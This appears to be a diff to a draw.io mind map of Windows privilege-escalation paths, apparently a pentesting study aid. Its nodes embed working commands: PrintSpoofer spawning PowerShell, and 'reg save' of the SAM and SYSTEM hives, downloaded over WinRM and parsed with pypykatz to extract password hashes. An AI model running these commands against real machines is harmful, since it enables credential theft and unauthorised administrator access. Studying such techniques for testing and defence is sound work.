@@ -1416,6 +1416,9 @@
         <mxCell id="v7aNdoy48dWiaJE41c0u-5" parent="1" style="rounded=1;whiteSpace=wrap;html=1;" value="&lt;div&gt;SEImpersonate Privilege&amp;nbsp;&lt;/div&gt;" vertex="1">
           <mxGeometry height="40" width="190" x="820" y="-413" as="geometry" />
         </mxCell>
+        <mxCell id="7o8DJ0UGml84ColHvwPg-2" edge="1" parent="1" source="v7aNdoy48dWiaJE41c0u-6" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;" target="7o8DJ0UGml84ColHvwPg-1">
+          <mxGeometry relative="1" as="geometry" />
+        </mxCell>
         <mxCell id="v7aNdoy48dWiaJE41c0u-6" parent="1" style="rounded=1;whiteSpace=wrap;html=1;" value="&lt;div&gt;SeBackupPrivilege or&amp;nbsp;&lt;/div&gt;&lt;div&gt;SeRestorePrivilege&lt;/div&gt;" vertex="1">
           <mxGeometry height="40" width="190" x="820" y="-360" as="geometry" />
         </mxCell>
@@ -1435,7 +1438,7 @@
         </mxCell>
         <object label="Printspoofer" cmd=".\PrintSpoofer64.exe -i -c powershell.exe" id="v7aNdoy48dWiaJE41c0u-13">
           <mxCell parent="1" style="rounded=1;whiteSpace=wrap;html=1;fillColor=default;strokeColor=#e5a50a;" vertex="1">
-            <mxGeometry height="62.5" width="210" x="1420" y="-470.62" as="geometry" />
+            <mxGeometry height="62.5" width="210" x="1450" y="-555" as="geometry" />
           </mxCell>
         </object>
         <mxCell id="v7aNdoy48dWiaJE41c0u-14" parent="1" style="rounded=1;whiteSpace=wrap;html=1;" value="Windows 7 / &amp;lt; Windows 10 1809 / Server 2016" vertex="1">
@@ -1444,8 +1447,16 @@
         <mxCell id="v7aNdoy48dWiaJE41c0u-15" parent="1" style="rounded=1;whiteSpace=wrap;html=1;" value="all versions of windows" vertex="1">
           <mxGeometry height="62.5" width="210" x="1140" y="-476.25" as="geometry" />
         </mxCell>
-        <mxCell id="7o8DJ0UGml84ColHvwPg-1" parent="1" style="rounded=1;whiteSpace=wrap;html=1;align=left;" value="&lt;div class=&quot;enlighter&quot; align=&quot;left&quot;&gt;&lt;div class=&quot;&quot;&gt;&lt;div&gt;&lt;span class=&quot;enlighter-text&quot;&gt;#backyp SAM + system(=lsa)&lt;/span&gt;&lt;/div&gt;&lt;div&gt;&lt;span class=&quot;enlighter-text&quot;&gt;cd c:\&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;&quot;&gt;&lt;div&gt;&lt;span class=&quot;enlighter-text&quot;&gt;mkdir Temp&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;&quot;&gt;&lt;div&gt;&lt;span class=&quot;enlighter-text&quot;&gt;reg save hklm\sam c:\Temp\sam&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;&quot;&gt;&lt;div&gt;&lt;span class=&quot;enlighter-text&quot;&gt;reg save hklm\system c:\Temp\system&lt;/span&gt;&lt;/div&gt;&lt;div&gt;&lt;span class=&quot;enlighter-text&quot;&gt;&lt;br&gt;&lt;/span&gt;&lt;/div&gt;&lt;div&gt;&lt;span class=&quot;enlighter-text&quot;&gt;#download backup via winrm&lt;/span&gt;&lt;/div&gt;&lt;div&gt;&lt;div class=&quot;enlighter&quot; style=&quot;&quot;&gt;&lt;div class=&quot;&quot;&gt;&lt;div&gt;&lt;span class=&quot;enlighter-text&quot;&gt;cd Temp&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;&quot;&gt;&lt;div&gt;&lt;span class=&quot;enlighter-text&quot;&gt;download sam&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;&quot;&gt;&lt;div&gt;&lt;span class=&quot;enlighter-text&quot;&gt;download system&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;br&gt;&lt;/div&gt;&lt;div&gt;#sur linux on extrait les hash&lt;/div&gt;&lt;div&gt;pypykatz registry --sam sam system&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;" vertex="1">
-          <mxGeometry height="272.5" width="260" x="1140" y="-390" as="geometry" />
+        <mxCell id="7o8DJ0UGml84ColHvwPg-4" edge="1" parent="1" source="7o8DJ0UGml84ColHvwPg-1" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;" target="7o8DJ0UGml84ColHvwPg-3">
+          <mxGeometry relative="1" as="geometry" />
+        </mxCell>
+        <object label="&lt;div align=&quot;center&quot;&gt;Create dump + find hash with pypikatz&lt;/div&gt;" commandes="#backyp SAM + system(=lsa)&#xa;cd c:\&#xa;mkdir Temp&#xa;reg save hklm\sam c:\Temp\sam&#xa;reg save hklm\system c:\Temp\system&#xa;&#xa;#download backup via winrm&#xa;cd Temp&#xa;download sam&#xa;download system&#xa;&#xa;#sur linux on extrait les hash&#xa;pypykatz registry --sam sam system" id="7o8DJ0UGml84ColHvwPg-1">
+          <mxCell parent="1" style="rounded=1;whiteSpace=wrap;html=1;align=center;strokeColor=light-dark(#000000,#E5A50A);" vertex="1">
+            <mxGeometry height="60" width="260" x="1140" y="-370" as="geometry" />
+          </mxCell>
+        </object>
+        <mxCell id="7o8DJ0UGml84ColHvwPg-3" parent="1" style="rounded=1;whiteSpace=wrap;html=1;fillColor=light-dark(#A20025,#FF1108);fontColor=#ffffff;strokeColor=#6F0000;" value="Local Admin" vertex="1">
+          <mxGeometry height="70" width="180" x="1720" y="260" as="geometry" />
         </mxCell>
       </root>
     </mxGraphModel>
